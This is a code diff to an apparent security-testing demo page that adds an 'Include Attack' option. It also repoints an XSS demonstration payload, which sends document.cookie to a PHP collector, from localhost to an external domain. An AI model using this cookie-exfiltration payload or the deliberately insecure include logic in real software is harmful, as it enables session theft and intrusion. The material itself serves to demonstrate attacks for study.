@@ -31,6 +31,13 @@
     </head>
 
     <body>
+		<?php
+        if (isset( $_GET['includeattack'] ) )
+        {
+            $format = "./includeattack/includeattack1";
+        	include( $format . '.php' );
+        }
+        ?>
 
         <div class="container">
             <div class="row">
@@ -55,6 +62,9 @@
 							</div>
 							<div class="radio">
 							    <label><input type="radio" id="rb-xss" name="attack" value="xss-attack">Cross-site scripting</label>
+							</div>
+							<div class="radio">
+							    <label><input type="radio" id="rb-include" name="attack" value="include-attack">Include Attack</label>
 							</div>
 							<div class="radio">
 							    <label><input type="radio" id="rb-none" name="attack" value="no-attack">None</label>
@@ -158,7 +168,7 @@
         	/* XSS Attack - Put malicious JS in login input */
             $('input[type=radio][name=attack]').change(function() {
 		        if (this.value == 'xss-attack') {
-                	$("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
+                	$("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/xssattack/xss.php?c=\"+document.cookie);");
 		        }
 		    });
 			
@@ -175,6 +185,7 @@
 					}
 					else
 					{
+						$("#displayWithoutSecurity").html("Searching in progress...");
 						$.ajax({
 							type: "POST",
 							url: "dictionaryattack/dictionary.php",
@@ -186,7 +197,8 @@
 						});
 					}
 					return false;
-            	} else {
+            	} 
+				else {
             		var login = $("#loginWithoutSecurity").val();
 					var pass = $("#passwordWithoutSecurity").val();
 					var prevent_sql = "no";
@@ -216,15 +228,20 @@
 					}
 					else
 					{
-						$.ajax({
-							type: "POST",
-							url: "processorWithoutSecurity.php",
-							data: dataString,
-							cache: false,
-							success: function(result){
-								$("#displayWithoutSecurity").html(result);
-							}
-						});
+						if($("#rb-include").is(":checked")){
+							window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
+						}
+						else{
+							$.ajax({
+								type: "POST",
+								url: "processorWithoutSecurity.php",
+								data: dataString,
+								cache: false,
+								success: function(result){
+									$("#displayWithoutSecurity").html(result);
+								}
+							});
+						}
 					}
 					return false;
             	}				
